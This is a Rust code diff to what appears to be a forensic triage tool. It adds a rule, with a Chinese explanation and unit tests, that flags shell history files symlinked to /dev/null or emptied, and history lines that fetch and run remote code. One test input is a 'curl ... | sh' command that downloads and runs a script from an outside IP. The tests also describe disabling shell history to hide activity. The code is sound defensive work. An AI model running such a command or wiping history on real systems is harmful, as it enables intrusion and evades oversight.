@@ -473,6 +473,31 @@ pub fn remote_execution_hint(line: &str) -> bool {
     mentions(without_grep_prefix(line), &REMOTE_EXECUTION) || in_writable_area(line)
 }
 
+/// A shell history that can no longer record anything, or a recorded command
+/// that pulled something in from elsewhere.
+pub fn tampered_or_telling_history(line: &str) -> bool {
+    if neutered_history(line) {
+        return true;
+    }
+    remote_execution_hint(line)
+}
+
+/// A history file symlinked away or truncated to nothing. Both are deliberate:
+/// the shell keeps writing and the record keeps being empty.
+fn neutered_history(line: &str) -> bool {
+    if !line.contains("history") {
+        return false;
+    }
+    let fields = line.split_whitespace().collect::<Vec<_>>();
+    let Some(mode) = fields.first() else {
+        return false;
+    };
+    if mode.starts_with('l') {
+        return line.contains("-> /dev/null") || line.contains("-> /dev/zero");
+    }
+    mode.starts_with('-') && fields.get(4).is_some_and(|size| *size == "0")
+}
+
 /// A socket on a handler port, or one owned by a shell or interpreter.
 pub fn suspicious_socket(line: &str) -> bool {
     if mentions(line, &SUSPECT_PORTS) || in_writable_area(line) {
@@ -1286,6 +1311,10 @@ static REASONS: &[(LineRule, &str)] = &[
         "标红的条目会下载并执行外部内容，或指向可写目录里的文件；计划任务和启动脚本里出现这些基本可以判定为植入。",
     ),
     (
+        tampered_or_telling_history as LineRule,
+        "标红的要么是被指向 /dev/null 或清零的历史文件——命令还在执行，记录永远是空的；要么是历史里下载并执行了外部内容。",
+    ),
+    (
         remote_session as LineRule,
         "标红的是来自网络的会话，或者没有终端的 root 会话；应急时先确认这些人是谁。",
     ),
@@ -1418,6 +1447,30 @@ mod tests {
         assert!(!super::locked_attribute("/etc/apt/sources.list.d:"));
         assert!(!super::locked_attribute("lsattr: Operation not supported"));
         assert!(!super::locked_attribute(""));
+    }
+
+    /// A history file pointed at /dev/null keeps the shell writing and the
+    /// record empty. It is deliberate, and it used to pass unremarked.
+    #[test]
+    fn history_that_cannot_record_is_reported() {
+        assert!(super::tampered_or_telling_history(
+            "lrwxrwxrwx 1 root root 9 Aug 25 23:05 /root/.bash_history -> /dev/null"
+        ));
+        assert!(super::tampered_or_telling_history(
+            "-rw------- 1 root root 0 Aug 25 23:05 /root/.bash_history"
+        ));
+        // A history file with content in it is not itself a finding.
+        assert!(!super::tampered_or_telling_history(
+            "-rw------- 1 root root 4096 Aug 25 23:05 /root/.bash_history"
+        ));
+        // A link that is not a history file is somebody else's rule.
+        assert!(!super::tampered_or_telling_history(
+            "lrwxrwxrwx 1 root root 9 Aug 25 23:05 /etc/mtab -> /proc/mounts"
+        ));
+        // What the history recorded still counts.
+        assert!(super::tampered_or_telling_history(
+            "curl http://198.51.100.7/x.sh | sh"
+        ));
     }
 
     /// /etc/mtab -> /proc/mounts is on every Linux host.
